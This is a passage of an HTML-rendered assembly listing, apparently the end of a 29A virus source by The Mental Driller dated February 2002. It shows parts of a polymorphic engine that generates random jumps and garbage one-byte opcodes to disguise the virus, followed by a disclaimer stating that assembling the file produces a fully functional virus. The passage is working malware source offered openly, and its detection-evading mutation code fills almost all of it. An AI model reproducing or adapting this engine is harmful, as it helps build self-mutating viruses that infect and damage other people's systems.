                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@GetARandomPowerOf2</span><span class="sc0"> </span><span class="sc1">; Get a 2^rnd number (only one</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; bit set)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetTheJump</span><span class="sc0">

      </span><span class="sc5">@@Normal</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; If we don't make this, we set the jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Poly_JumpRandomExecution</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; to complete to</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">; 0 and we exit.</span><span class="sc0">

   </span><span class="sc5">@@GetARandomPowerOf2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; A 2^rnd number is achieved by getting</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; a random number from 0 to 31 and then</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">   </span><span class="sc1">; shifting 1 by that number. Easy :).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc5">@@LoopRotate</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RotateFinish</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopRotate</span><span class="sc0">
       </span><span class="sc5">@@RotateFinish</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_MakeRandomExecution</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Get a garbage one-byte instruction.</span><span class="sc0">
</span><span class="sc5">Poly_GetGarbageOneByter</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">      </span><span class="sc1">; Get a random number from 0 to 7</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">   </span><span class="sc1">; Add F8 to get some interesting instrc.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FAh</span><span class="sc0">   </span><span class="sc1">; CLI?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnCMC</span><span class="sc0">   </span><span class="sc1">; Then set CMC</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">   </span><span class="sc1">; STD?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnNOP</span><span class="sc0">   </span><span class="sc1">; Then set NOP (bad things happen if not!)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">   </span><span class="sc1">; Other type of opcodes?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">      </span><span class="sc1">; If not, return the opcode</span><span class="sc0">
     </span><span class="sc5">@@ReturnNOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">    </span><span class="sc1">; Set NOP</span><span class="sc0">
     </span><span class="sc5">@@Return</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@ReturnCMC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0">   </span><span class="sc1">; Set CMC</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Poly_GetGarbageOneByter</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of the polymorphic engine</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc5">EndOfCode</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">PreMain</span><span class="sc0">

</span><span class="sc4">(</span><span class="sc10">c</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Mental</span><span class="sc0"> </span><span class="sc5">Driller</span><span class="sc4">/</span><span class="sc2">29A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">somewhere</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">February</span><span class="sc0"> </span><span class="sc2">2002</span><span class="sc0">

</span><span class="sc5">DISCLAIMER</span><span class="sc0">

</span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">research</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">educational</span><span class="sc0"> </span><span class="sc5">purposes</span><span class="sc0"> </span><span class="sc5">only.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">assembling</span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">produce</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">fully</span><span class="sc0"> </span><span class="sc5">functional</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">warned.</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">kind</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">material</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">illegal</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">country</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">state</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">should</span><span class="sc0">
</span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">computer.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">declines</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">illegal</span><span class="sc0">
</span><span class="sc5">activity</span><span class="sc0"> </span><span class="sc5">performed</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">possesor</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">assembled</span><span class="sc0"> </span><span class="sc5">form</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0">
</span><span class="sc5">including</span><span class="sc0"> </span><span class="sc5">possesion</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc4">/</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">spreading</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">generated</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0">
</span><span class="sc5">code.</span><span class="sc0">

</span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">provided</span><span class="sc0"> </span><span class="sc3">"as is"</span><span class="sc5">.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">deliberated</span><span class="sc0"> </span><span class="sc5">modification</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0">
</span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">derive</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">must</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">considered</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">sourced</span><span class="sc0"> </span><span class="sc5">here.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">source</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">considered</span><span class="sc0">
</span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc5">modified</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">derivated</span><span class="sc0"> </span><span class="sc5">virus.</span><span class="sc0">
</span></div></body>
</html>
